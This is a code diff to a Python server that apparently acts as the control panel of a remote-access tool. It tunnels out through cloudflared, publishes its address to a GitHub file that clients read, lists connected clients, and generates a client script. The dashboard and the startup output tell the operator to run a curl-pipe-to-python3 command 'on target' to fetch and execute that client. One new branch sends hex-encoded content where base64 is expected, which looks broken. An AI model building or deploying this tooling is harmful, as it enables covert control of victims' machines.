@@ -51,14 +51,12 @@ config = load_config()
 def github_push_url(url):
     """Push the URL to the GitHub file."""
     try:
-        # Get current file SHA
         req = urllib.request.Request(
             f"https://api.github.com/repos/{GITHUB_OWNER}/{GITHUB_REPO}/contents/{GITHUB_FILE}",
             headers={"Authorization": f"token {GITHUB_TOKEN}"}
         )
         with urllib.request.urlopen(req) as r:
             sha = json.loads(r.read())["sha"]
-        # Update
         req2 = urllib.request.Request(
             f"https://api.github.com/repos/{GITHUB_OWNER}/{GITHUB_REPO}/contents/{GITHUB_FILE}",
             data=json.dumps({
@@ -76,6 +74,27 @@ def github_push_url(url):
             pass
         print(f"  ✓ URL pushed to GitHub")
         return True
+    except urllib.error.HTTPError as e:
+        if e.code == 404:
+            # File doesn't exist yet — create it
+            req3 = urllib.request.Request(
+                f"https://api.github.com/repos/{GITHUB_OWNER}/{GITHUB_REPO}/contents/{GITHUB_FILE}",
+                data=json.dumps({
+                    "message": f"Create URL file: {url}",
+                    "content": url.encode().hex()
+                }).encode(),
+                headers={
+                    "Authorization": f"token {GITHUB_TOKEN}",
+                    "Content-Type": "application/json"
+                },
+                method="PUT"
+            )
+            with urllib.request.urlopen(req3) as r:
+                pass
+            print(f"  ✓ URL file created on GitHub")
+            return True
+        print(f"  ⚠ GitHub push failed ({e.code}): {e.read().decode()[:200]}")
+        return False
     except Exception as e:
         print(f"  ⚠ GitHub push failed: {e}")
         return False
@@ -91,10 +110,7 @@ def start_cloudflared():
         line = proc.stdout.readline()
         sys.stdout.write(f"  [cloudflared] {line.strip()}\n")
         if "trycloudflare.com" in line:
-            url = line.split("https://")[1].split()[0]
-            break
-        if "https://" in line:
-            url = line.split("https://")[1].split()[0]
+            url = line.split("https://")[1].split()[0].rstrip(".,)")
             break
     return proc, url
 
@@ -197,13 +213,13 @@ body{background:#0a0a0a;color:#fff;font-family:'Courier New',monospace;min-heigh
     <input id="url-input" placeholder="your-tunnel.trycloudflare.com">
     <button onclick="saveUrl()">Save to GitHub</button>
     <span class="saved" id="url-saved">✓ saved</span>
-    <span class="github-link">Clients read from: <a href="__GITHUB_URL_FILE__" target="_blank" style="color:#0f0">github.com/__GITHUB_OWNER__/__GITHUB_REPO__/__GITHUB_FILE__</a></span>
+    <span class="github-link">Clients read from: <a href="__GITHUB_URL_FILE__" target="_blank" style="color:#0f0">github.com/yvlfiction/server/site</a></span>
   </div>
   <div class="section-title">Connected Clients</div>
   <div class="clients" id="clients"><div class="empty">No clients connected</div></div>
   <div class="rebuild-box">
     <h3>Generate Client</h3>
-    <p class="hint">Run on target (Windows or Linux): <code>curl -s https://YOUR_URL/client | python3</code></p>
+    <p class="hint">Run on target: <code>curl -s https://YOUR_URL/client | python3</code></p>
     <button onclick="rebuild()">Generate Client Script</button>
     <pre class="rebuild-out" id="rebuild-out"></pre>
   </div>
@@ -337,9 +353,6 @@ def broadcast():
 
 async def index(request):
     html = DASHBOARD_HTML.replace("__GITHUB_URL_FILE__", GITHUB_URL_FILE)
-    html = html.replace("__GITHUB_OWNER__", GITHUB_OWNER)
-    html = html.replace("__GITHUB_REPO__", GITHUB_REPO)
-    html = html.replace("__GITHUB_FILE__", GITHUB_FILE)
     return web.Response(text=html, content_type="text/html")
 
 async def api_config_get(request):
@@ -451,7 +464,7 @@ async def on_startup(app):
         github_push_url(url)
         print(f"  ✓ Public URL: https://{url}")
     else:
-        print(f"  ⚠ Could not detect tunnel URL.")
+        print(f"  ⚠ Could not detect tunnel URL. Set it manually in dashboard.")
     print(f"\n  Dashboard: http://localhost:{PORT}")
     print(f"  Client:    curl -s https://{url or '<your-url>'}/client | python3\n")
     app["cf_proc"] = cf_proc
